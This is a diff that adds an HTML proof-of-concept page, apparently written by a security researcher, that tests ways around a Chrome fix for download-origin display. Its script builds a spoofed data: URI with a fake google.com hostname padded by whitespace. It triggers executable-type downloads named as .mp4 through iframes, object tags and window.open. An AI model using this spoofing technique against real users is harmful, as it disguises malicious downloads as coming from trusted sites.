@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Bypass Tests - Download Origin Fix</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #0a0a0f; color: #ddd; padding: 16px; }
+  h2 { color: #ff4444; font-size: 16px; margin-top: 20px; }
+  button { padding: 12px 16px; margin: 4px; border: 1px solid #444; background: #1a1a2e; color: #fff; border-radius: 6px; cursor: pointer; font-size: 13px; }
+  button:active { opacity: .7; }
+  .info { color: #888; font-size: 12px; margin: 6px 0; }
+  pre { background: #111; padding: 10px; border-radius: 6px; font-size: 11px; overflow-x: auto; }
+</style>
+</head>
+<body>
+
+<h2>Download Origin Fix Bypass Tests</h2>
+<p class="info">Chrome 148+ — Fix: opaque origins are now OMITTED from download UI</p>
+
+<h3>Test 1: Blob URL Download</h3>
+<p class="info">blob: URLs have NON-opaque origin (inherit from page). Does Chrome still show the origin?</p>
+<button onclick="testBlob()">Test Blob URL Download</button>
+
+<h3>Test 2: Data URI via Different Trigger Methods</h3>
+<p class="info">Does the trigger method affect origin display?</p>
+<button onclick="testIframeDownload()">iframe Download</button>
+<button onclick="testFormDownload()">Form POST Download</button>
+<button onclick="testFetchBlobDownload()">fetch + blob Download</button>
+
+<h3>Test 3: Short Data URI (no fake hostname)</h3>
+<p class="info">Does a clean data URI (without fake hostname) still get origin omitted?</p>
+<button onclick="testCleanDataUri()">Clean data: URI</button>
+
+<h3>Test 4: Download via Object/Embed</h3>
+<p class="info">Using &lt;object&gt; or &lt;embed&gt; tags to trigger download</p>
+<button onclick="testObjectDownload()">Object Tag Download</button>
+
+<h3>Test 5: Window.open to data URI</h3>
+<p class="info">Opening data URI directly via window.open</p>
+<button onclick="testWindowOpen()">window.open(data:...)</button>
+
+<h3>Test 6: android-bypass.html full tests</h3>
+<p class="info">Full Android-specific bypass suite</p>
+<button onclick="location.href='android-bypass.html'">Open Android Bypass</button>
+
+<hr>
+<pre id="log"></pre>
+
+<script>
+var S = ' '.repeat(200);
+var B64 = 'ZXN0dGVzdHRlc3R0ZXN0';
+var DATA_SPOOF = 'data:https://google.com/' + S + 'application/x-msdownload;base64,' + B64;
+var DATA_CLEAN = 'data:application/x-msdownload;base64,' + B64;
+
+function L(m) {
+  document.getElementById('log').textContent += '\n' + new Date().toLocaleTimeString() + ' ' + m;
+}
+
+function download(uri, name) {
+  var a = document.createElement('a');
+  a.href = uri; a.download = name;
+  document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  L('Download: ' + name + ' | URI: ' + uri.substring(0, 60) + '...');
+}
+
+// Test 1: Blob URL
+function testBlob() {
+  L('--- BLOB URL TEST ---');
+  L('Blob URLs inherit page origin (non-opaque)');
+  var blob = new Blob(['test payload'], {type: 'application/x-msdownload'});
+  var url = URL.createObjectURL(blob);
+  L('Blob URL: ' + url);
+  L('Expected: origin should show ' + window.location.hostname);
+  download(url, 'blob-test.mp4');
+}
+
+// Test 2a: iframe download
+function testIframeDownload() {
+  L('--- IFRAME DOWNLOAD TEST ---');
+  var iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.srcdoc = '<script>var a=document.createElement("a");a.href="'+DATA_SPOOF+'";a.download="iframe-test.mp4";document.body.appendChild(a);a.click();<\/script>';
+  document.body.appendChild(iframe);
+  L('Download triggered from srcdoc iframe');
+  L('srcdoc inherits parent origin (non-opaque)');
+  L('Check: does origin show or is it omitted?');
+}
+
+// Test 2b: Form download
+function testFormDownload() {
+  L('--- FORM DOWNLOAD TEST ---');
+  L('Form-based download not possible with data: URIs');
+  L('Forms require http/https action URLs');
+}
+
+// Test 2c: fetch + blob
+async function testFetchBlobDownload() {
+  L('--- FETCH + BLOB TEST ---');
+  L('Creating download from fetched content...');
+  // Create inline content and download as blob
+  var blob = new Blob(['test content'], {type: 'application/x-msdownload'});
+  var url = URL.createObjectURL(blob);
+  download(url, 'fetch-blob-test.mp4');
+}
+
+// Test 3: Clean data URI
+function testCleanDataUri() {
+  L('--- CLEAN DATA URI TEST ---');
+  L('Data URI without fake hostname');
+  download(DATA_CLEAN, 'clean-data-test.mp4');
+  L('Check: is origin omitted or shown?');
+}
+
+// Test 4: Object tag
+function testObjectDownload() {
+  L('--- OBJECT TAG TEST ---');
+  var obj = document.createElement('object');
+  obj.data = DATA_SPOOF;
+  obj.type = 'application/x-msdownload';
+  obj.style.display = 'none';
+  document.body.appendChild(obj);
+  L('Object tag added with data URI');
+  L('May trigger download or show plugin error');
+}
+
+// Test 5: window.open
+function testWindowOpen() {
+  L('--- WINDOW.OPEN TEST ---');
+  L('Opening data URI directly...');
+  window.open(DATA_SPOOF, '_blank');
+  L('Check: does this trigger download? What origin is shown?');
+}
+
+L('Ready. Test each strategy above.');
+L('After each test, check Chrome → Downloads for origin display.');
+</script>
+</body>
+</html>
